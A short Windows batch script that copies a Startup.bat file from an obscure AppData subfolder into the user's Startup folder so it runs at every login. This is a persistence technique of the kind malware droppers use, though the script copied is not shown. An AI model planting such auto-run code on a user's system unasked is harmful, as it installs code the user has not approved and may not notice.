

@echo off

REM Set the source batch file and destination folder
set "source_file=%userprofile%\AppData\local\yess\Startup.bat"
set "destination_dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM Copy the source batch file to the startup folder
copy "%source_file%" "%destination_dir%\Startup.bat"

echo Batch script cloned to the startup folder.
exit
